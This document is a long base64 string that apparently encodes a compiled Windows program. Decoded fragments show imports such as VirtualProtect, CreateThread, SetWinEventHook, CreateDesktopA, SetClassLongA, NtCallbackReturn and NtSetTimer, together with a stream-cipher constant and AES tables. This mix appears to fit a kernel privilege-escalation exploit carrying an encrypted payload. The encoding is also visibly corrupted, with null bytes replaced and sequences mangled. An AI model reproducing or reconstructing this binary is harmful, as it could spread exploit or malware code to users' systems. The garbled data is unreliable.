PSYgECAPICAgM1d9CEEgJiAQDyAgIFkBICBTM9uJCF0BICAITQEgIFEBICABVQEgIE0MGDR0ZUUIUCAgIBVwJiAQdTBWdQgVZCYgECB0JiAQMRVkJiAQUU0IUHUIFWgmIBBeRQxdDFAgICBQFSYgEHQJU1NQFWwmIBBbXQggfCQkaiBYMw/DgHQgDyAPFA8iZDggICBwBGYgPU1aIHUGA3QJDE4MCFZXFR8gEGEMIBUIKCAQaiAmIBAVXCggEGsgeCYgEBo9eCYgEA8mIBAPAyAQJiAQDwMgECYgEA8DIBAmIBAPAyAQJiAQDwMgECYgEA8DIBAmIBB8BnxZBHhVICYgEAIgECYgEFVRUSYgEGUgVldQLDNVAiAQZnUUawV4JiAQIBADDwxNAyAQPAIgECABRVBqBGoEVxVMKCAQdCUCIBAgRVB1agRXFUwoIBBVDEhyAjNfXlVRUSYgEFYzV1AsdVUCIBBmdRRrBXgmIBAgEAMPDE0DIBBFUGoEPGoEVxVMKCAQdCUCIBAgIEVQdWoEVxVMKCAQVQxIcl9eVVFRZSBFASAgIBUIKCAQJiAQZDAgICAmIBAVKCAQJiAQPSYgEHUEW1lIdQROTD14JiAQFnwCQR89fCYgEAF1AjFqIEVQaiBoJRAgIBUoIBB1BBMRBSYgEAEgICBFASAgIEVVEFNWMzNTDzYBICBRUUVQaCAgIBUUKCAQUBVQKCAQIV1XaCIgIGoINSYgEBUoIBAPICAgM1ZWVhVIKCAQICAgRQggICAgICBQagRXaBkgEFZWFQwoIBAPICAgag9WFVQoIBBqAVYVRCggEDNQaCAgIFBQUEVQFXgoIBBFdAYsASAgVhVYKCAQaBAnICBWFSgoIBB0G2pkx4cgICABICAgFTAoIBBqIFYVPCggEFdqIDUmIBAVICkgEEV0IFAVdCggEDkdJiAQdSNoAyAgFTAoIBBFQEUCDwI5HSYgEHQDM0N0IFYVECggEF81JiAQFQQoIBAKAiAQOSB0BQxdCHIXQwMTVQhbCCAgICBbCCBVV0UIM8m/BUtWD0AEFAIgEEEicj0gAiAQBQwCIBAgICAgBRACIBBQICAgEiAgIB4gICAIICAgT3VfBCBTHQwCIBAKEAIgEBQCIBAYAiAQExsDFAIgEAMYAiAQFAIgEBgCIBAIcwUgICAIcwUgICAdDAIgEAoQAiAQW1UUAiAQdQoPMTNQP3UMdQgCCCAlKCAQJSggECUoIBAlKCAQJRQoIBAlGCggECUcKCAQJSAoIBAlJCggECUoKCAQJSwoIBAlMCggECU0KCAQJTgoIBAlICggECVAKCAQJUQoIBAlSCggECVMKCAQJVAoIBAlVCggECVYKCAQJSggECU8KCAQJWAoIBAlECggECUMKCAQJQgoIBAlBCggECV8KCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECUoIBAlKCAQJSggECV4KCAQJXQoIBAlECkgECUMKSAQJSggECUUKSAQJQgpIBAlICkgECUEKSAQJWwoIBAlaCggECAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgdCwgIGIsICBSLCAgRCwgICAgICAOICAgCiAgLiAgOgogIFAgIGYKICBuICB6CiAgJiwgICAgCiAgICAKICAgIAogIAIsICASLCAgOCwgICAgICAGLyAgLiAgICAgIFQuICBCLiAgLCAgLCAgLCAgLCAgLCAgLCAgLCAgLCAgCi0gIB4tICAwLSAgQi0gIFQtICBiLSAgdC0gIC0gIC0gIC0gIC0gIC0gIC0gIC0gIC0gIAguICAcLiAgKi4gICAgICAgICAgICAgICAgICAuICAuICAuICAuICAuICBwLiAgLiAgICAgIHwgICAgICAgICAgICAoICApICAgICAgICAgIH4sICAgKCAgCCAgICAgICAgICBkLiAgdCggICAgICAgICAgICAuICAoICApICAgICAgICAgIBYvICBoKCAgICAgICAgICAgICAgICAgICAgICAgIHQsICBiLCAgUiwgIEQsICAgICAgDgogICAgIC4KICA6ICBQCiAgZiAgbgogIHogICYsICAKICAgIAogICAgCiAgICACLCAgEiwgIDgsICAgICAgBi8gIC4gICAgICBULiAgQi4gICwgICwgICwgICwgICwgICwgICwgICwgIAotICAeLSAgMC0gIEItICBULSAgYi0gIHQtICAtICAtICAtICAtICAtICAtICAtICAtICAILiAgHC4gICouICAgICAgICAgICAgICAgICAgLiAgLiAgLiAgLiAgLiAgcC4gIC4gICAgICAWBXN0cmNweSAgBG1lbXNldCAgOQNfc253cHJpbnRmICBeA19zdHJpY21wICBtc3ZjcnQuZGxsICA7AUdldEN1cnJlbnRQcm9jZXNzIAFHZXRTeXN0ZW1JbmZvIDUCSXNXb3c2NFByb2Nlc3MgIFIDVGxzU2V0VmFsdWUgCgJIZWFwRnJlZSAgfgNXYWl0Rm9yU2luZ2xlT2JqZWN0ID4BR2V0Q3VycmVudFRocmVhZElkICBCA1NsZWVwIAUCSGVhcEFsbG9jIEMDU2xlZXBFeCBRA1Rsc0dldFZhbHVlIEsgQ3JlYXRlRXZlbnRBICAsA1NldFRocmVhZEFmZmluaXR5TWFzayAgAkhlYXBDcmVhdGUgIHQDVmlydHVhbFByb3RlY3QgIB8DU2V0UHJpb3JpdHlDbGFzcyAgMQNTZXRUaHJlYWRQcmlvcml0eSACUmVzdW1lVGhyZWFkICB2AUdldE1vZHVsZUhhbmRsZUEgIEsDVGVybWluYXRlVGhyZWFkIE8DVGxzQWxsb2MgIDEgQ2xvc2VIYW5kbGUgbCBDcmVhdGVUaHJlYWQgIAFHZXRQcm9jZXNzSGVhcCAgUANUbHNGcmVlIEtFUk5FTDMyLmRsbCAgAlVuaG9va1dpbkV2ZW50ICB+AlNldFdpbkV2ZW50SG9vayBdIENyZWF0ZU1lbnUgIAECUG9zdFF1aXRNZXNzYWdlIAggQXBwZW5kTWVudUEgRwJTZXRDbGFzc0xvbmdBIGYCU2V0UGFyZW50IDsCU2VuZE1lc3NhZ2VBICACVHJhbnNsYXRlTWVzc2FnZSAgIENyZWF0ZVdpbmRvd0V4QSAgRGVmV2luZG93UHJvY0EgIBYCUmVnaXN0ZXJDbGFzc0EgIAJTZXRNZW51SW5mbyACU2V0V2luZG93TG9uZ0EgICBHZXRDbGFzc0xvbmdBIEgCU2V0Q2xhc3NMb25nVyACU2hvd1dpbmRvdyAgeQJTZXRUaHJlYWREZXNrdG9wICAgR2V0Q2xhc3NOYW1lQSABUG9zdE1lc3NhZ2VBICBDAlNldEFjdGl2ZVdpbmRvdyACU2V0V2luZG93UG9zICAgRGVzdHJveVdpbmRvdyAgRGlzcGF0Y2hNZXNzYWdlQSAgOgFHZXRNZXNzYWdlQSACU3lzdGVtUGFyYW1ldGVyc0luZm9XIFAgQ3JlYXRlRGVza3RvcEEgIEMgQ2xvc2VEZXNrdG9wICBVU0VSMzIuZGxsICBoAlJ0bEdldFZlcnNpb24gYiBOdENhbGxiYWNrUmV0dXJuICABUnRsQWxsb2NhdGVIZWFwIEcBTnRTZXRUaW1lciAgdgJSdGxJbml0VW5pY29kZVN0cmluZyAgQAJSdGxGcmVlSGVhcCAgTnRDcmVhdGVUaW1lciBudGRsbC5kbGwgAVJwY1N0cmluZ0ZyZWVBICABVXVpZFRvU3RyaW5nQSBSUENSVDQuZGxsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIyMjIgMwgzDDMUMxgzIDMkM002UzZpNnc2fTY2NjY2NjY2JTcvNz43SDdXN2E3cDd6Nzc3Nzc3Nzc3BjgiODE4WThzODg4ODg4OAQ5DDk5OTk5OhM7IDstOzo7RztVO2I7Ozs7OwY8MTxWPGY8fjw8PD0ZPns+Pj4+Cj8sP1U/XT8/PyAQICAcASAgEzAgMCkwPjBJMFowYDB7MDAwMDAwMAoxNzE9MU0xezExMTExMTEOMkUyVzIyMjIcMzEzXjMzMzMzNDQfNTU1NQE2IDYiNio2NTZINk82NnE2NjYJNxc3QjdMN1o3azd3Nzc3Nwo4JTgvODk4UThYOHo4ODg4OBw5Njk5OTk5BDoKOiM6PjpDOkw6ZTo6OjogO2A7Ozs7Ozs7O148eDx9PDw8PDwUPTs9dj09PT09PSA+Cic+Mj5UPj4+Pj4+BD8MPxo/Lj97Pz8/ICAgICAgOAEgICEwMTA4MD4wRDBLMFEwWDBdMGQwaTBwMHUwfDAwMDAwMDAwMDAwMDAwCjEXMSkxRjFZMWQxcjExMTExMTExMTECMhIyKjI9MnwyMjIyMjIyMjIGMxozJjM8M0UzTjNUM2IzaDN1MzMzMzMzFzQlNDQ1NFc0XTRjNGk0dTR7NDQ0NDQ0NDQ0NDQ0NDQENQo1EDUWNRw1IjUoNS41NDU6NUA1RjVMNVI1WDVeNWQ1ajVwNXY1fDU1NTU1NTU1NTU1NTU1NTU1NTU1NTUgNgY2DDYSNhg2HjYkNjYwNjY2PDZCNkg2TjZUNlo2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhwYW5kIDMyLWJ5dGUga2V4cGFuZCAxNi1ieXRlIGtjY8aEfHx3d3t7Cmtr1rFvb1TFkVAwMAMBAQJnZ30rK1YZYte15qurTXZ2RcqPH0DJiX19FVlZR0cK7K2tQWfUs1/qr69FI1NyclvCt3Uc4a6TPWomJkxaNjZsQT8/fgJPzINcNDRoUTQIcXFz2KtTMTFiPxUVKgwEBAhSx5VlIyNGXsOdKBgYMDcPBQUgLwkgIA42EhIkGz0maScnTs2yf3V1GwkJEh10LCxYLhoaNC0bGzZublpaW1JSTTs7dmHWt86zfXspKVI+cS8vXhNTU2jRuSAgICAsICBAH8ixeVtbampGy43ZvmdLOTlySkpMTFhYSs+Fa9C75aqqTxZDQ01NVTMzZhFFRRAGAgIEf39QUEQ8PHgl46ioS1FRXUBABT8hSDg4cATfvGN3ddqvYyEhQjAQECAaDm3Sv0zNgRQMDBg1ExMmL19fNUREORcXLlfEk1V+fkc9PXpkZF1dChkZMnNzYGAZT09/3KNmIiJEfioqVDsKRkYp07hrPBQUKHnep15eHQoKFnbbrTtWMjJkTjo6dB4KFElJCgYGDGwkJEhcXcKfbtO976ysQ2JixKg5MTfTi3l5MkPIi1k3N25tbdqMAWTVsU5O4KmpSWxsVlYgJc+vZWXKjnp66a6uRxgICBDVum94eG8lJUpy4oCmJBwcOFfHtHNRxpcjfN2hdHQhHx8+S0vcvWEKD3BwQj4+fMS1cWZmSEgFAwMGARIODhxhYV81NWpXV9C5aRdYJx0dOic4E+uzmCszEREiaWlw2akgMy0iHh48FSBJzodVVXgoKFB636UDWQkXChrav2UxQkJoaEFBKXfigJNaEQ8PHsuwe1RU1rttOhYWLGNjxqV8fHd3e3sKa2vWvW9v3rHFkVQwMFABAQIDZ2fOqSsrVn0Z17ViTXZ2yo9FH8mJQH19FVlZR0cKQdSzZ19F6pycI1Nyclt1HD0mJkxqNjZsWj8/fkECzINPNDRoXFE0CHFx2KtzMTFiUxUVKj8EBAgMx5VSIyNGZcOdXhgYMCg3BQUgDy8gIA4JEhIkNhs9JicnTml/dXUJCRIbHSwsWHQaGjQuGxs2LW5u3LJaWu6goFtSUjs7dk3Wt2F9KSlSez4vL15xE1NT0bloICAgICwgQB95W1tqatS+y41GZzk5cktKSkxMWFjPhUrQu2sqTxZDQ01NMzNmVRFFRRACAgQGf39QUDw8eEQlS1FRXUBABT8hODhwSARj37Z32q91ISFCYxAQIDAaDtK/bc2BTAwMGBQTEyY1L19f4ZeXNUREFxcuOcSTV1V+fj09ekdkZMisXV0ZGTIrc3NgYBlPT9yjfyIiRGYqKlR+OwpGRilrFBQoPN6neV5eCgoWHdutdjsyMmRWOjp0TgoUHklJBgYMCiQkSGxcwp9d071uQ2JixKY5MTd5eTLIi0M3N25ZbW3atwHVsWROTtKpSWxs2LRWViAlZWXKr3p69I6urkcICBAYb3h4JSVKb+KAplxyHBw4JFdzxpdRI92hfHR0Hx8+IUtL3b1h3IsKD3BwPj58QnFmZsyqSEgDAwYFAQ4OHBJhYcKjNTVqX1dXadCGF1gdHTonJzgTKxERIjNpadK72alwIDMtHh48IhUgzodJVVUoKFB436V6A1kKGhdlMUJCaGjQuEFBw5kp4oCTWncPDx4Re1RUbRYWLDpjxqVjfHx3d3t7CmvWvWtv3rFvxZFUMFAwAQIDAWfOqWcrVn0rGde1YterTXZ2yo9FyoIfyYlAfX0VWVlHRwpB1LNn1KJfReqvnCNTcnJbdcK3HD0mTGomNmxaNj9+QT8CzINPNGhcNFE0CHFx2KtzMWJTMRUqPxUECAwEx5VSI0ZlI8OdXhgwKBg3BSAPBS8gDgkgEiQ2Ehs9JidOaSd/zbJ1dQkSGwkdLFh0LBo0LhobNi0bbtyyblpaW1JSO3ZNO9a3Ydazfc6zKVJ7KT4vXnEvE1NT0bloICAgICwgQCAfecixW1tq1L5qy41Gy75n2b45cks5SkpMTFhYz4VK0LtrTxZDQ01NM2ZVMxFFRRACBAYCf39QUDx4RDwlS1FRXUBABT8hOHBIOARj37x32q91IUJjIRAgMBAaDtK/bc2BTAwYFAwTJjUTL19fNUREFy45F8STV8SnVX5+PXpHPWTIrGRdXRkyGXNzYGAZT0/co38iRGYiVH47CkZGKWvTuBQoPBTep3leXgoWHQrbrXY7MmRWMjp0TjoKFB4KSUkGDAoGJEhsJFzCn13TvW7TrENixKZiOTE3eXkyyItDN25ZN23at20B1bFkTk5JbNi0bFZWICVlyq9lenpHCBAYCG/Vunh4JUpvJS5cci4cOCQcV3PHtMaXUSPdoXx0dB8+IR9LS2HcvQoPcHA+fEI+ccS1ZsyqZkhIAwYFAwEOHBIOYcKjYTVqXzVXV2nQuRdYHTonHSc4EwoRIjMRadK7admpcNmOIDMtHjwiHhUgzodJVVUoUHgo36V634wDWQkKGhcKZdq/MUJCaNC4aEFBKS1ady0PHhEPe8uwVFRt1rsWLDoWxqVjY3x8d3d7ewrWvWtr3rFvb1RQMDACAwEBzqlnZ1Z9KysZYk3mq6t2dkUfQH19FVlZR0cKQeytrWdfReqvryNTcnJbdcK3HD1MaiYmbFo2Nn5BPz8CT2hcNDRRNAhxcXNiUzExKj8VFQgMBARSRmUjI14wKBgYNyAPBQUvDgkgICQ2EhIbPSZOaScnf82ydXUSGwkJHVh0LCw0LhoaNi0bG9yybm5aWltSUnZNOzthfc6zUnspKT5ecS8vE1NTaCAgICAsQCAgH3nIsVtb1L5qakZn2b5ySzk5SkpMTFhYSs+7a0/lqqoWQ0NNTWZVMzMRRUUQBAYCAn9/UFB4RDw8JUvjqKhRUV1AQAU/IXBIODgEY9+8d3VCYyEhIDAQEBoObdKBTBgUDAwmNRMTL19fNURELjkXF1dVfn56Rz09yKxkZF1dMisZGXNzYGAZT09/RGYiIlR+Kio7CkZGKWvTuCg8FBR53rxeXhYdCgp2O2RWMjJ0Tjo6FB4KSUkMCgYGSGwkJFxdwr1uQ++srMSmYmI5MTd5eTJDblk3N9q3bW0BZNWcTk5J4Kmp2LRsbFZWICXKr2VlenpH6a6uEBgICG/Vunh4Sm8lJVxy4oCmOCQcHFdzx7RRI3x0dD4hHx9LS2HcvQoPcHB8Qj4+ccS1zKpmZkhIBgUDAwEcEg4OwqNhYWpfNTVXV2nQuRdYOicdHSc4EysiMxER0rtpaXAgMy08Ih4eFSBJzqpVVVB4KCh6A1kJGhcKZdq/MUJC0LhoaEFBKVp34oCTHhEPD3vLsFRUbda7LDoWFmNjY2N8fHx8d3d3d3t7e3tra2trb29vbzAwMDABAQEBZ2dnZysrKyvXq3Z2dnbKgn19fX1ZWVlZR0dHR/Ctra3UonJycnImJiYmNjY2Nj8/PzQ0NDRxcXFxMTExMRUVFRUEBAQEIyMjIxgYGBgFBQUFICAgIBISEhInJycndXV1dQkJCQksGhoaGhsbGxtubm5uWlpaWlJSUlI7Ozs71rMpKSkpLy8vL1NTU1MgICAgICAgIFtbW1tqampqy745OTk5SkpKSkxMTExYWFhY76qqQ0NDQ01NTU0zMzMzRUVFRQICAgJ/f39/UFBQUDw8PDxRUVFRQEBAQDg4ODghISEQEBAQDAwMDBMTExNfX19fRERERBcXFxfEp35+fn49PT09ZGRkZF1dXV0ZGRkZc3Nzc2BgYGBPT09PIiIiIioqKipGRkZG7ri4FBQUFF5eXl4KCgoKMjIyMjo6OjoKSUlJSQYGBgYkJCQkXFzTrGJiYmJ5eXl5Nzc3N21tbW1OTk5ObGxsbFZWVlZlZWVlenp6eggICAh4eHh4JSUlJeKAphwcHBx0dHR0Hx8fH0tLS0twcHBwPj4+PmZmZmZISEhIAwMDAw4ODg5hYWFhNTU1NVdXV1cdHR0dEREREWlpaWnZjh4eHh5VVVVVKCgoKN+MCkJCQkJoaGhoQUFBQS0tLS0PDw8PVFRUVBYWFhZQUVNlQX7DpBcaXic6aztFH1gDS1UwIG12dsyIJUwCT8WARDUmYklaZxslDkVdAnUvEkxGa18DFXptWVItIXRYKWlJRMmOanV4eWs+WHEnTxdmIMm0On0YSmMxGjNRRX9TYndkaxwrCFhoSHAZRWzelHtSI3MCS3JXHypVZiAoA8K1L3vFhgg3KDAjagMCXBYrHM+KeSBpTmXVvgUGH2I00YrEnVMuNFUyBXU5QAZxXlEQbiE+PQbdlgU+Rk1UBV1xbwYEFVAkGUNAd2dC6LCIIDhbGXlHIHwPQnweICAgIAlIKzJwER5OclpsDlY4Dx7Vrj0nOS02ZA8gIVxoVFs6LjYkZyAMD1fSlu60nhtPIGFpS3daFhoSHCAqQyI8HRcbEgogCQ7Hi/K5qLYtyKkeFBlXTCB13Zl/JgFyO2ZENH5bdilDI2hjMRBjQkAiEyARxoR9JEo9ETJtKUsvHTBSCndsFnBIESJkR8SMGj8sfVYzIk5JOMqMNgrUmM+BKHom2qQ/OiwKeFBfamJGflQT2JBeOS7Dgl18aS1vEiU7yKd9GBBuY3s7CXgmGFluAeyomk9lbn4Iz7whFdmbNm9KCXwpMTEjPzBmNTdOdMqC0JAV2KczSgRBDlB/LxdNdk1DVE0E0Z4bakwfLH9RZUYEXl01AXN0LkEKWh1nUtuSM1YQE0dtYdeaegw3FFk8Eyc1YRw8R3pZ0pw/c1V5FBg3c1NbFG8934ZEeD5oLDQkOEByHRYMJeK8i0k8KEEKcQE53rMMCNiQVmRhe3AydFxsSEJX0KdRUGVBflMXGl4nOms7RR9YA0swIFVtdnbMiEwCJU9ENSZiWkkbJWcORV11LwJMEkZrXwPnnJIVem1ZUtqDLSF0WGlJKcmORHVqeXg+WGtxJ0/hvrYXIGY6fUpjGDEaM1Fgf1NiRXdkaxwKCGhIcFhFGWzelHtScyMCS3IfV1VmKCDCtS8De8WGCDfTpSgwI2oDAhZcHM+KeSBpTmXNvgUGYjQfxIpTLjRVBTJ1CjlAcV4GEG5RIT4G3ZY9BT7drk1GVF1xBQYEbxVQGSTWl0NAzJ5nd0LosL0gWxk4eQp8Rw9CfB4gICAgCQoySHARHnJabE4OOA9W1a49HjktNicPCmRcaCFUWy42JDpnCgxXD9KRG08gYUt3WmkaEhwWCiI8QxcbEh0KDgrHi/KtqLYtHhQZVyB1TN2ZfyYBclw7ZkR+WzQpQ3YjaGMxyoVjQhAiE0ARxoQgJEp9PTIRKW0vHUswUiB3FitscEgRZEciPxosfVbYkDMiTkk4yowK1Jg2eigmPzoseFAgX2pGflRiE8K42JA5Ll7Dgl1pfC1vEiXPszt9GBBjbjt7eCYJGFluAU9uZX7PvCEIFTZvSgl8KdayMSM/KjEwZjVOdDfKgtCQ2KczFQRKQVB/DhcvTXZDTU1UBN+10Z5qTBsfLFFlRn9eBDUBXXRzQQouHWda25JSVhAzR20TYdeaDDd6FFk8EydhNRxHejzSnFlzVT8UGHk3c1NfW289FER4yoFoPjQkOCxAXx0WciUMSTwoIEEBOXEMCNicVmR7YTJwXGxIdFdCUVBBflNlFxrDpCc6XjtrH0VYSwMwIFV2bcyIdgIlTE8qNSZEYklaJWcbRQ5dLwJ1TBJGawNfFW16UlktdFghSSlpyY5EdWp4eVhrPidx4b62TxcgZn06YxhKGjFRM1NiRX9kd2scCEhwWGhFGd6UbHtScyNLcgIfV1VmKiAoLwPFhns306UIKDAjAwJqFlzPigoceSBpTmUFBtW+NB9ixIouNFNVBTJ1CjlAcV4GblEQIT7dlj0GPt2uBU1GVHEFXQYEb1AVGSTWl0BDZ3fosL1CIBk4W3l8RwpCfA8eICAgIAkySBEecFpsTnIOD1Y4PR4tNic5DwpkXGghW1Q2JDouCgxnVw/SlhtPYSB3WmlLEhwWGgoqIjxDGxIdFwkOCgrHti0eFMipVxl1TCB/YAEmclxmRDtbNH5DdikjaGMxY0IQE0AixoQgEUp9JD0RMiltHUsvMApSdwpsFnARSEciZMSMGj99ViwzIklOOMqM1Jg2Cs+BeijetyY/Oix4UApqflRiRhPYkDkuXsOCXWl8by0lz7MSOxgQfW5jO3smCXhZbhgBT2VufiEIFdmbb0o2CSl8MT8qMSMwNWZOdDfKkNCnMxUESkF/DlAXL012Q01UTQTRnmpMGywfZUZ/UV4EAV01c3QKLkFnWh3bklIQM1ZtE0fXmmE3egxZFBM8J2E1HEd6PNKcWVU/cxQYeXM3U1s9FG9EeNuvyoFoPiQ4LDRfQB0WcgwlPChJCkE5cQEMCN6z2JxWZHthMnBsSHRcQldRUH5TZUEaw6QXOl4nO2sfRVhLAyBVMG12diVMAk8mRDViSVolZxtFDl0CdS8STEZrA18Vem1ZUi1YIXRJKWlEdWp4eWs+WCdxTxdmIH06YxhKMRozUWJFf1N3ZGscKwhwWGhIGUVsUnsjc3ICS1cfZipVICgvA8K1e9OlCDcwKCMCagNcFiscz6d5IE5pZQbVvgUfYjTEijRTLlUFMuGKpHUKOUBeBnFREG4+IT0G3a4FPk1G5pG1VHEFXQRvBhVQGSTWl+m9iUNAZ3fZsEIgOFsZecihRyB8fA9CHiAgICAJMkgrHnARbE5yWg4PVjg9HtWuNic5LSBkD2ghXFRbJDouNgxnIA9X0pYbT2EgWmlLdxwWGhIgKjxDIhIdFxsOCiAJx4stFMipHlcZTCB13Zl/JgFcckQ7Zls0fnYpQyNoYzFCEGMTQCIgEcaFfSRKPREybSkdSy8wClJ3K2wWcBFIRyJkxIwaP1YsfSIzTkk4ypg2CtSmz4EoeiY/LPCfmJsKeGpfVGJGfhMuXjnDn11pfG8tz7MSJTsQfRhuY3s7CXgmbhhZAU9lbn4hCM+8FdmbSjZvCSl8MSoxIz8wNWZ0N07KgtCQMxXYp0oEQX8OUBcvdk1DTVRNBEwbah8sRn9RZQReAV01c3QuQQpaHWdSM1YQbRNH1pphN3oMWRQ8Eyc1YRx6PEdZVT9zGHkUczdTX1sUbz14RMqBPmg4LDQkX0AWch0MJShJPEEKOXEBCN6zDNicZFZ7YXAySHRcbEJXUlJSUgkJCQlqampqMDAwMDY2NjY4ODg4QEBAQHx8fHw5OTk5Ly8vLzQ0NDRDQ0NDRERERFRUVFR7e3t7MjIyMiMjIyM9PT09TExMTAoKCgpCQkJCTk5OTggICAjigKZmZmZmKCgoKCQkJCR2dnZ2W1tbW0lJSUltbW1tJSUlJXJycnJkZGRkaGhoaBYWFhbUpFxcXV1dXWVlZWVsbGxscHBwcEhISEhQUFBQXl5eXhUVFRVGRkZGV1dXV9irICAgIApYWFhYBQUFBUVFRUUGBgYGLB4eHh4/Pz8PDw8PAgICAgMDAwMBAQEBExMTE2tra2s6Ojo6EREREUFBQUFPT09PZ2dnZ+qXl/C0tLRzc3NzdHR0dCIiIiLnra01NTU1Nzc3NxwcHBx1dXV1bm5ubkdHR0caGhoacXFxcR0dHR0pKSkpxYlvb29vYmJiYg4ODg4YGBgYGxsbG1ZWVlY+Pj4+S0tLS3l5eXkgICAgeHh4eFpaWlofHx8f3agzMzMzICAgIDExMTESEhISEBAQEFlZWVknJycnX19fX2BgYGBRUVFRf39/fxkZGRlKSkpKCi0tLS16enp6yZzvoKA7Ozs7TU1NTSoq67u7PDw8PFNTU1NhYWFhFxcXFysrKysEBAQEfn5+fnd3d3cmJiYmaWlpaRQUFBRjY2NjVVVVVSEhIQwMDAx9fX19ICAgASAgIAIgICAEICAgCCAgIBAgICAgICAgQCAgICAgIBsgICA2ASAgICAgICAgICAgICAgICAgICAgICAgICAgICAgASAgICAgICAgICAJICAgICAgICAgICAgICAgICAgIAkgICAgIAogICAgICAgICAgICAgICAgICAgICAgAyAgICAgAiAgICAgICAgICAgCiAgICAgIAogICAgICAgICAgICAgIAEgICAgICAIICAgICAgICAgICRAASAgICAgICAgIAEgICAgICAgICAgICAgICAgICAgICAgICABIAEgICAgIH8gQ2xvc2VIYW5kbGUgIENyZWF0ZVRocmVhZCAgS0VSTkVMMzIuZGxsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDZ9STA1aEtLelNCYmp9HXkgPhpDOBJWKBoEIlUICh8cEwY1UTQaDBlRQ28jMnN4XjEmRHYjUyBRNSQGYyo5Y0gSw4ggbmYJIGQdKW4aawFJfwkgFl8vR00zeEMGPiFKTBUQQ1dBVciZH2dRZQkDKAjduEgqARA5XkcVSWJrFwwJKyknT1kbOEICBR01PHosZX1eGkMET31dcdyj2LQcbR/DuTFXR35rOmd4UEhnFHEWLm8ibgzXgyBlIDU2Qis2dg5MeHxCEARdFwVJedSpKVVDWENEPRdPQCAOaTtAPRJ2bXwvVnZlZCIkAyoCZjwr3rBMDwpJBn8lKEVCGmkzFxliQSB6MzsaHT1OIw5BPCci2o0gORYk0J1MG0R6MSECIXEsGmtXMBYRe0EgO01cNDddeSBCdQVKzbUTbVfCkWMcdEQ9dFYPIV9TDDdEazE6em45CuSNglZTNjtaAgM6dF42dsOOSRjNs2QXYRN1BH9FY2VrGwx7AWJ1TVInGhTcsht8EjUVQ0BxeQVjIBsmbE4GFFIECkV7ZWEYVQpjeEwkcggEREAKSAp2RUUKHjkYBmoCRT1CeGbbidu3KeO6i0TFjwImGxJta9S4UnMpFgMPIF83CVJEKQ5ZClIZGicTyIZ8FhsyVkNJakEJNBZZTCAQEGRBJjMuMi8RLxMRTUhwRjlKWEw3LQxLUmx8YiU3Pi4FZksCZgpANx0dO2zdnTYyNDF5ClYKDG9+XCARUCJ/L1JEFBRsD20pEAUMNBkCdBlDJikCWxlTKnZsBXQ6IhN2Lg4gYcy7DlI+INC/CVVGeCQZLjcOE3NREh4nOVcrLtqnRgp4UFcPIDQxaF8ISyx3dwkgGilxVD4hfXRjTCfcqD4mQdKkDHQ0eWwecHAXZBQGLTFESyIWN1d9yYV6Xmc/FBzSslBodjldQElnX3gILDFjDw4vO1xLGjJaSxVrAxt0JH0ieiEcSngrYRBAeDsgfU5IUyouHzp1cDXRl2LWpQxLZ34ldDAqG8uYHhgXc1sC2I4UYgYgBh1jeQR2G09h1JBSViAkLXYKMVJLI1I5Q2xpK05+BEYcJXRDexp2K2LZsGxeMV5bZxEiI3VjDFIIGtmcIDrdpxdGYwhN1LcBTtCfZ342WS8fDFwcYTp+fUMSdm9LJknSrmQvJQpEanczN9KITUstGFZKOFFYWUVNM15o66qkc38yU0p4HTF4CVF7IUs9HyAvDMyWCjDJllhXZAgUYxtSeWVYN2REYWRuSFQgZFBZcBg2SXBaFn4MCH07W3RiIH5dI1crJwZCem5SRCMU1rhvUSB2NXZTa3RkeuuXg8OISURHF3EuPWtXTTA0WEYgIGM5cxFsGGc2ITR1ZTQyKmQtRlchyYUFcwU9Ak1HQyHrkIgpKRHDugFzTxMjFEZDcHpcUwYXBRofcmJ6etKIPDTfihZfZmMaLBlyBUxFVVMpLmdPR38EUxcGemkObDBhHmE015I0dzEGyadtTTAxURY+2IET3JUgYVkiSFxUCnMbyqhrOtK2VGFINgwTbicmfhsda0EjZ0wWVxY2ERRCfRAXUyFSaUYyCmMd35BoDBUGcjFSf0U3fn/GpSlafxVXCgp4PHJVSktrfTIKS9yeMncGclZNIDojIWkxJEM6cBJbOBJYx